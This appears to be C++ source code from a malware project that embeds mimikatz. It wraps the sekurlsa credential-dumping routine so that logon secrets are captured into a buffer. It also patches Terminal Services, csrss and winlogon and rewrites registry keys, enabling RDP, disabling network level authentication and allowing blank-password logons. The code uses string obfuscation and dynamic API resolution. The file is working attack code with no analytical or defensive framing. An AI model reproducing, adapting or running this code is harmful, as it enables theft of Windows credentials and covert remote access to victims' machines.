#include "mimikatz.h"
#include "core\string.h"
#include "core\reestr.h"

#define KULL_M_WIN_BUILD_XP		2600
#define KULL_M_WIN_BUILD_2K3	3790
#define KULL_M_WIN_BUILD_VISTA	6000
#define KULL_M_WIN_BUILD_7		7600
#define KULL_M_WIN_BUILD_8		9200
#define KULL_M_WIN_BUILD_BLUE	9600

struct ReestrKeyValue
{
	const char* key;
	const char* name;
	DWORD value;
};

ReestrKeyValue XP_ReestrUpdate[] =
{
	{ _CT_("SYSTEM\\CurrentControlSet\\Control\\Terminal Server"), _CT_("fDenyTSConnections"), 0 },
//	{ _CT_("SYSTEM\\CurrentControlSet\\Control\\Terminal Server"), _CT_("fSingleSessionPerUser"), 0 },
	{ _CT_("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Licensing Core"), _CT_("EnableConcurrentSessions"), 0 },
//	{ _CT_("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"), _CT_("EnableConcurrentSessions"), 1 },
	{ _CT_("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"), _CT_("AllowMultipleTSSessions"), 1 },
//	{ _CT_("SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services"), _CT_("MaxInstanceCount"), 5 },
	{ _CT_("SYSTEM\\CurrentControlSet\\Control\\Lsa"), _CT_("LimitBlankPasswordUse"), 0 },
	{ 0 }
};

ReestrKeyValue Vista_ReestrUpdate[] =
{
	{ _CT_("SYSTEM\\CurrentControlSet\\Control\\Terminal Server"), _CT_("fDenyTSConnections"), 0 },
	{ _CT_("SYSTEM\\CurrentControlSet\\Control\\Terminal Server"), _CT_("fSingleSessionPerUser"), 0 },
	{ _CT_("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp"), _CT_("UserAuthentication"), 0 },
	{ _CT_("SYSTEM\\CurrentControlSet\\Control\\Lsa"), _CT_("LimitBlankPasswordUse"), 0 },
	{ 0 }
};

StringBuilder* outText = 0;

//extern "C"
//{

DWORD MIMIKATZ_NT_MAJOR_VERSION, MIMIKATZ_NT_MINOR_VERSION, MIMIKATZ_NT_BUILD_NUMBER;

extern VOID WINAPI RtlGetNtVersionNumbers(LPDWORD pMajor, LPDWORD pMinor, LPDWORD pBuild);
extern NTSTATUS kuhl_m_sekurlsa_all(int argc, wchar_t * argv[]);
extern NTSTATUS kuhl_m_sekurlsa_init();
extern NTSTATUS kuhl_m_sekurlsa_clean();
extern NTSTATUS kuhl_m_ts_multirdp(int argc, wchar_t * argv[]);
extern NTSTATUS kuhl_m_ts_csrsrv( DWORD pid );
extern NTSTATUS kuhl_m_ts_winlogon( DWORD pid );
extern NTSTATUS kuhl_m_ts_msgina( DWORD pid );

void OutputData( const wchar_t* format, va_list va )
{
	if( !outText ) return;
	wchar_t* out = WStr::Alloc( 3 * WStr::Len(format) + 100 );
	API(USER32, wvsprintfW)( out, format, va );
	StringBuilder s;
	s.ToWin1251(out);
	outText->Cat(s);
	WStr::Free(out);
}

wchar_t* _wcsdup( const wchar_t* s )
{
	int len = WStr::Len(s);
	wchar_t* s2 = WStr::Alloc(len);
	for( int i = 0; i < len; i++ )
		s2[i] = s[i];
	s2[len] = 0;
	return s2;
}

void free( void* ptr )
{
	Mem::Free(ptr);
}

//};

bool ExtactAllLogons( StringBuilder& s )
{
	API(NTDLL, RtlGetNtVersionNumbers)(&MIMIKATZ_NT_MAJOR_VERSION, &MIMIKATZ_NT_MINOR_VERSION, &MIMIKATZ_NT_BUILD_NUMBER);
	MIMIKATZ_NT_BUILD_NUMBER &= 0x00003fff;
	outText = &s;
	NTSTATUS res = kuhl_m_sekurlsa_init();
	if( res == STATUS_SUCCESS )
	{
		res = kuhl_m_sekurlsa_all( 0, 0 );
		//kuhl_m_sekurlsa_clean();
	}
	outText = 0;
	return res == STATUS_SUCCESS;
}

bool MimikatzPatchRDP()
{
	API(NTDLL, RtlGetNtVersionNumbers)(&MIMIKATZ_NT_MAJOR_VERSION, &MIMIKATZ_NT_MINOR_VERSION, &MIMIKATZ_NT_BUILD_NUMBER);
	MIMIKATZ_NT_BUILD_NUMBER &= 0x00003fff;
	outText = 0;
	NTSTATUS res = kuhl_m_ts_multirdp( 0, 0 );
//	if( res == STATUS_SUCCESS )
//	{
		MimikatzUpdateReestr(MIMIKATZ_NT_BUILD_NUMBER);
		return true;
//	}
//	return false;
}

bool MimikatzUpdateReestr( DWORD build_ver )
{
	if( build_ver == 0 )
	{
		API(NTDLL, RtlGetNtVersionNumbers)(&MIMIKATZ_NT_MAJOR_VERSION, &MIMIKATZ_NT_MINOR_VERSION, &MIMIKATZ_NT_BUILD_NUMBER);
		build_ver = MIMIKATZ_NT_BUILD_NUMBER;
	}
	ReestrKeyValue* rkv = 0;
	if( build_ver <= KULL_M_WIN_BUILD_XP )
		rkv = XP_ReestrUpdate;
	else
		rkv = Vista_ReestrUpdate;
	while( rkv->key )
	{
		Reestr r;
		if( r.Create( HKEY_LOCAL_MACHINE, DECODE_STRING(rkv->key) ) )
			r.SetDWORD( DECODE_STRING(rkv->name), rkv->value );
		rkv++;
	}
	return true;
}

bool MimikatzPatchCsrss( DWORD pid )
{
	return kuhl_m_ts_csrsrv(pid) == STATUS_SUCCESS;
}

bool MimikatzPatchWinlogon( DWORD pid )
{
	bool res = kuhl_m_ts_winlogon(pid) == STATUS_SUCCESS;
	res &= kuhl_m_ts_msgina(pid) == STATUS_SUCCESS;
	return res;
}

#pragma function(wcsrchr)
const wchar_t * __cdecl wcsrchr(_In_z_ const wchar_t * _Str, _In_ wchar_t _Ch)
{
	return WStr::Chr( _Str, _Ch );
}
